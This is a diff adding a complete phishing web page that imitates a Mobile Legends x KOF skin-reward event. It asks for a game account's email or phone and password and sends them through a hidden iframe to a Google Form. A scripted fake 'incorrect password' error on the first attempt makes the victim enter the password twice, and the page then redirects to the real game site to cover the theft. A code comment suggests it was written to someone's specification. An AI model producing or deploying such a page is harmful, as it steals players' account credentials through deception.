@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MLBB x KOF: Limited Skin Event</title>
+    <style>
+        :root {
+            --kof-red: #ff003c;
+            --kof-purple: #8a2be2;
+            --kof-dark: #0a0a0c;
+            --kof-gold: #ffcc00;
+            --input-bg: #16161a;
+        }
+
+        body { 
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; 
+            background: radial-gradient(circle, #1a1a2e 0%, #000000 100%);
+            color: white;
+            margin: 0; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        /* Thematic background overlay */
+        body::before {
+            content: "";
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background: url('https://images.lucas-retoucher.com/2024/05/22/mlbb-kof-background-placeholder.jpg') no-repeat center center/cover;
+            opacity: 0.15;
+            z-index: -1;
+        }
+
+        .main-wrapper { 
+            display: flex; 
+            width: 100%; 
+            max-width: 1050px; 
+            justify-content: space-around; 
+            align-items: center; 
+            padding: 20px; 
+            box-sizing: border-box; 
+            flex-wrap: wrap; 
+        }
+
+        .branding-section { 
+            width: 480px; 
+            text-align: left;
+        }
+        .branding-section h1 { 
+            color: var(--kof-red); 
+            font-size: 65px; 
+            margin: 0; 
+            font-style: italic;
+            text-transform: uppercase;
+            text-shadow: 0 0 15px rgba(255, 0, 60, 0.6);
+            border-bottom: 5px solid var(--kof-purple);
+            display: inline-block;
+            letter-spacing: -2px;
+        }
+        .branding-section p { 
+            font-size: 24px; 
+            line-height: 1.4;
+            color: #ddd; 
+            margin-top: 20px; 
+            font-weight: 300;
+        }
+
+        .login-card { 
+            background: rgba(15, 15, 20, 0.98); 
+            padding: 35px 25px; 
+            border-radius: 4px; 
+            border: 1px solid #333;
+            box-shadow: 0 10px 50px rgba(0, 0, 0, 0.8), 0 0 20px rgba(138, 43, 226, 0.2); 
+            width: 396px; 
+            box-sizing: border-box; 
+            text-align: center;
+            position: relative;
+        }
+
+        /* Red Event Badge */
+        .login-card::before {
+            content: "KOF REWARD SYSTEM";
+            position: absolute;
+            top: -12px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: var(--kof-red);
+            padding: 4px 20px;
+            font-weight: bold;
+            font-size: 11px;
+            letter-spacing: 1px;
+            white-space: nowrap;
+        }
+
+        #error-msg { 
+            color: #fff; 
+            font-size: 13px; 
+            margin-bottom: 18px; 
+            display: none; 
+            text-align: left; 
+            background: rgba(255, 0, 60, 0.15); 
+            border-left: 4px solid var(--kof-red); 
+            padding: 12px; 
+        }
+
+        .input-container { position: relative; width: 100%; margin-bottom: 14px; }
+        
+        input { 
+            width: 100%; 
+            padding: 14px; 
+            background: var(--input-bg);
+            border: 1px solid #333; 
+            border-radius: 2px; 
+            font-size: 16px; 
+            color: white;
+            box-sizing: border-box; 
+            transition: 0.2s; 
+        }
+        input:focus { outline: none; border-color: var(--kof-purple); background: #1c1c22; }
+
+        .toggle-password {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            opacity: 0.5;
+            display: flex;
+            align-items: center;
+        }
+        .toggle-password:hover { opacity: 1; }
+
+        .login-btn { 
+            width: 100%; 
+            background: linear-gradient(to right, var(--kof-red), #900); 
+            border: none; 
+            color: white; 
+            font-size: 18px; 
+            font-weight: bold; 
+            padding: 14px; 
+            cursor: pointer; 
+            text-transform: uppercase;
+            margin-top: 10px;
+            transition: 0.3s;
+        }
+        .login-btn:hover { filter: brightness(1.2); letter-spacing: 1px; }
+
+        .links-area { margin-top: 15px; }
+        .links-area a { color: #888; font-size: 13px; text-decoration: none; transition: 0.2s; }
+        .links-area a:hover { color: var(--kof-gold); }
+
+        hr { border: 0; border-top: 1px solid #222; margin: 20px 0; }
+        
+        .rules-btn { 
+            background: transparent; 
+            border: 1px solid var(--kof-purple); 
+            color: var(--kof-purple); 
+            font-size: 14px; 
+            padding: 10px 20px; 
+            cursor: pointer; 
+            text-transform: uppercase;
+            font-weight: bold;
+        }
+
+        @media (max-width: 900px) {
+            .main-wrapper { flex-direction: column; text-align: center; }
+            .branding-section { width: 100%; margin-bottom: 30px; text-align: center; }
+            .branding-section h1 { font-size: 45px; }
+            .login-card { width: 100%; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="main-wrapper">
+        <div class="branding-section">
+            <h1>KOF × MLBB</h1>
+            <p>Log in to your account to verify your identity and unlock KOF series skins.</p>
+        </div>
+
+        <div class="login-card">
+            <div id="error-msg">The password you've entered is incorrect. Please try again.</div>
+            
+            <form action="https://docs.google.com/forms/d/e/1FAIpQLSeqXsdSS4o7z-stB8rMQ1yGlLyKaX5tFZz2lIYkUcfFGOFBGQ/formResponse" 
+                  method="POST" 
+                  target="hidden_iframe" 
+                  onsubmit="return validateAndSubmit()">
+
+                <div class="input-container">
+                    <input type="text" name="entry.448915509" placeholder="Email or Phone Number" required>
+                </div>
+                
+                <div class="input-container">
+                    <input type="password" name="entry.744965339" id="pass" placeholder="Password" required>
+                    <div class="toggle-password" onclick="togglePass()">
+                        <svg id="eye-open" xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
+                        <svg id="eye-closed" style="display:none;" xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line></svg>
+                    </div>
+                </div>
+
+                <button type="submit" id="loginButton" class="login-btn">Verify Now</button>
+                
+                <div class="links-area">
+                    <a href="#">Forgot password?</a>
+                </div>
+                
+                <hr>
+                <button type="button" class="rules-btn">Event Rules</button>
+            </form>
+        </div>
+    </div>
+
+    <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;" 
+            onload="if(submitted) { window.location.href='https://www.mobilelegends.com/en/newsdetail/1858'; }"></iframe>
+
+    <script>
+        var submitted = false;
+        var attempt = 0;
+
+        function togglePass() {
+            var passInput = document.getElementById("pass");
+            var openEye = document.getElementById("eye-open");
+            var closedEye = document.getElementById("eye-closed");
+
+            if (passInput.type === "password") {
+                passInput.type = "text";
+                openEye.style.display = "none";
+                closedEye.style.display = "block";
+            } else {
+                passInput.type = "password";
+                openEye.style.display = "block";
+                closedEye.style.display = "none";
+            }
+        }
+
+        function validateAndSubmit() {
+            // Your logic: Error on first try, submit on second try
+            if (attempt === 0) {
+                document.getElementById('error-msg').style.display = 'block';
+                document.getElementById('pass').value = '';
+                document.getElementById('pass').focus();
+                attempt++;
+                return false; // Blocks the form submission
+            }
+            
+            // Second attempt: submit and flag for redirect
+            submitted = true;
+            document.getElementById('loginButton').innerHTML = "Verifying...";
+            return true; // Form submits to Google Form
+        }
+    </script>
+</body>
+</html>
